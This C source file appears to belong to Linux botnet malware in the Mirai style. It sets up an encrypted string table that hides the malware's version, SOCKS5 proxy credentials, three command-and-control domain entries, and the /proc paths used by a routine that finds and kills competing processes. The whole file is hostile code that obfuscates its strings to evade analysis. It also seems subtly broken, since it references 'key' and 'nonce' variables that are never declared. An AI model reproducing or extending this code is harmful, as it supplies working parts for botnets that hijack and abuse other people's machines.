#define _GNU_SOURCE

#include "chacha20/chacha20.h"
#include "chacha20_table.h"

char *table_key = "\x73\x6F\x6D\x65\x6F\x66\x66\x64\x65\x65\x7A\x6E\x75\x74\x73";
int length = 16;

Encryption *enc = NULL;

static void xor_add(EncryptionTable etable, const char *string, int len)
{
    Encryption *crypt = &enc[(int)etable];

    crypt->string = _strdup((char *)string);
    crypt->len = len;

    char decrypt[crypt->len + 1];
    chacha20_xor(key, 1, nonce, crypt->string, crypt->string, crypt->len);
    crypt->string[crypt->len] = '\0';

#ifdef DEBUG
    debug("added %s to structure on index: %d\n", crypt->string, (int)etable);
#endif
}

void xor_init(void)
{
    enc = calloc(ENC_TABLE_MAX, sizeof(Encryption));

    xor_add(EXECUTE_MESSAGE, "\x3A\xA8\xD8\x1F\x9F\x55\x82\xC0", 8);
    xor_add(PROC_NAME, "\x73\xA5\xC3\x05\xDE\x5E\x97\xD6\x61", 9);                        // /bin/bash
    xor_add(MALWARE_VERSION, "\x6E\xE9\x9A\x45\xC5\x63\x85\xCA\x6A\x82\xF8\xFD", 12);

    xor_add(SOCKS5_USER, "\x30\xB2\xC9\x12\xAE\x49\x85\xC0\x7B", 9);
    xor_add(SOCKS5_PASS, "\x2C\xA6\xD9\x18\x86\x53\x84\xC1\x56\x84\xEE\xA7\x68", 13);


    xor_add(C2_DOMAIN_1, "\x31\xA2\xC5\x1C\xDF\x4F\x95\xCD\x66\x86\xE7\xB8\x6D\x31\x3E\xE1\xCE\xC2\xD6\x54\xDB\x7D\xF9\x66\x3F", 25);
    xor_add(C2_DOMAIN_2, "\x31\xA2\xC5\x1C\xDF\x4F\x95\xCD\x66\x86\xE7\xB8\x6D\x31\x3E\xE1\xCE\xC2\xD6\x54\xDB\x7D\xF9\x66\x3F", 25);
    xor_add(C2_DOMAIN_3, "\x31\xA2\xC5\x1C\xDF\x4F\x95\xCD\x66\x86\xE7\xB8\x6D\x31\x3E\xE1\xCE\xC2\xD6\x54\xDB\x7D\xF9\x66\x3F", 25);

    xor_add(KILLER_PROC, "\x73\xB7\xD8\x04\x92\x13", 6); // /proc/

    xor_add(KILLER_FD, "\x73\xA1\xCE", 3);                          // /fd
    xor_add(KILLER_EXE, "\x73\xA2\xD2\x0E", 4);                     // /exe
    xor_add(KILLER_MAPS, "\x73\xAA\xCB\x1B\x82", 5);                // /maps
    xor_add(KILLER_STATS, "\x73\xB4\xDE\x0A\x85\x4F", 6);           // /stats
    xor_add(KILLER_STACK, "\x73\xB4\xDE\x0A\x92\x57", 6);           // /stack
    xor_add(KILLER_CMDLINE, "\x73\xA4\xC7\x0F\x9D\x55\x98\xC0", 8); // /cmdline

    xor_add(PROC_NET_TCP, "\x73\xB7\xD8\x04\x92\x13\x98\xC0\x7D\xC6\xFF\xAB\x6F", 13);      // /proc/net/tcp
    xor_add(PROC_SELF_EXE, "\x73\xB7\xD8\x04\x92\x13\x85\xC0\x65\x8F\xA4\xAD\x67\x3B", 14); // /proc/self/exe
}
